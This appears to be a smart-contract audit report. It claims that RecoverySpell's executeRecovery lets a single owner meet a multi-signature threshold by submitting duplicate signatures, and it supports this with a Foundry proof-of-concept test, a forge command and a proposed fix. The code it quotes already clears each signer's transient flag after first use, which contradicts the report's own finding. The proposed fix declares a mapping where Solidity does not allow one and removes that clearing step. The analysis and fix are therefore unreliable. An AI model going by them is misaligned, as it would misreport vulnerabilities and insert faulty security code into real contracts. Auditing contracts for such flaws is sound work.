# Vulnerability details

## Vulnerability details:

The RecoverySpell contract's executeRecovery function is vulnerable to signature replay attacks. The current implementation does not prevent a single owner from submitting multiple valid signatures for the same digest. This allows a malicious owner to bypass the intended multi-signature threshold and potentially take control of the Safe.

## Proof of Concept

To demonstrate this vulnerability, follow these steps:

1. Create a test file named `test/RecoverySpellDuplicateSignatures.t.sol` with the following content:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/RecoverySpell.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract MockSafe {
    address[] public owners;

    constructor(address[] memory _owners) {
        owners = _owners;
    }

    function execTransactionFromModule(address, uint256, bytes memory, uint8) external pure returns (bool) {
        return true;
    }

    function getOwners() external view returns (address[] memory) {
        return owners;
    }
}

contract RecoverySpellDuplicateSignaturesTest is Test {
    RecoverySpell public recoverySpell;
    uint256[] public recoveryPrivateKeys;
    MockSafe public safe;

    function setUp() public {
        recoveryPrivateKeys = new uint256[](3);
        recoveryPrivateKeys[0] = 1;
        recoveryPrivateKeys[1] = 2;
        recoveryPrivateKeys[2] = 3;

        address[] memory recoveryOwners = new address[](3);
        for (uint256 i = 0; i < 3; i++) {
            recoveryOwners[i] = vm.addr(recoveryPrivateKeys[i]);
        }

        safe = new MockSafe(recoveryOwners);
        recoverySpell = new RecoverySpell(recoveryOwners, address(safe), 2, 2, 1 days);
    }

    function testDuplicateSignatures() public {
        vm.warp(block.timestamp + 2 days); // Ensure we're past the delay period

        bytes32 digest = recoverySpell.getDigest();
        uint8[] memory v = new uint8[](2);
        bytes32[] memory r = new bytes32[](2);
        bytes32[] memory s = new bytes32[](2);

        for (uint256 i = 0; i < 2; i++) {
            (v[i], r[i], s[i]) = vm.sign(recoveryPrivateKeys[0], digest);
        }

        // This should revert, but it doesn't
        recoverySpell.executeRecovery(address(0), v, r, s);
    }
}
```

2. Run the test using Forge:

```bash
forge test --match-contract RecoverySpellDuplicateSignaturesTest -vvv
```

3. Observe that the test passes, indicating that the RecoverySpell contract accepted duplicate signatures from a single owner, bypassing the intended multi-signature threshold.

4. To further illustrate the vulnerability, you can add a test for valid signatures from different owners:

```solidity
function testValidSignatures() public {
    vm.warp(block.timestamp + 2 days);

    bytes32 digest = recoverySpell.getDigest();
    uint8[] memory v = new uint8[](2);
    bytes32[] memory r = new bytes32[](2);
    bytes32[] memory s = new bytes32[](2);

    (v[0], r[0], s[0]) = vm.sign(recoveryPrivateKeys[0], digest);
    (v[1], r[1], s[1]) = vm.sign(recoveryPrivateKeys[1], digest);

    recoverySpell.executeRecovery(address(0), v, r, s);
}
```

This test demonstrates that the contract accepts signatures from different owners as intended.

5. The vulnerability stems from the following code in RecoverySpell.sol:

```solidity
for (uint256 i = 0; i < v.length; i++) {
    address recoveredAddress = ECDSA.recover(digest, v[i], r[i], s[i]);
    bool valid;

    assembly ("memory-safe") {
        valid := tload(recoveredAddress)
        if eq(valid, 1) { tstore(recoveredAddress, 0) }
    }

    require(
        valid && recoveredAddress != address(0),
        "RecoverySpell: Invalid signature"
    );
}
```

This code checks if each signature is valid and corresponds to a recovery owner. However, it does not prevent the same owner from signing multiple times, allowing a single owner to meet the threshold requirement alone.

## Recommended Mitigation Steps

1. Implement a mechanism to track which owners have already signed:

```solidity
mapping(address => bool) private hasSigned;

for (uint256 i = 0; i < v.length; i++) {
    address recoveredAddress = ECDSA.recover(digest, v[i], r[i], s[i]);
    bool valid;

    assembly ("memory-safe") {
        valid := tload(recoveredAddress)
    }

    require(
        valid && recoveredAddress != address(0) && !hasSigned[recoveredAddress],
        "RecoverySpell: Invalid or duplicate signature"
    );

    hasSigned[recoveredAddress] = true;
}
```

2. After the loop, verify that the number of unique signers meets the required threshold:

```solidity
uint256 uniqueSigners = 0;
for (uint256 i = 0; i < owners.length; i++) {
    if (hasSigned[owners[i]]) {
        uniqueSigners++;
    }
}
require(uniqueSigners >= recoveryThreshold, "RecoverySpell: Insufficient unique signers");
```

3. Reset the hasSigned mapping at the end of the function to prepare for future recovery attempts.

These changes ensure that each owner can only contribute one signature towards the threshold, preventing a single owner from bypassing the multi-signature requirement.
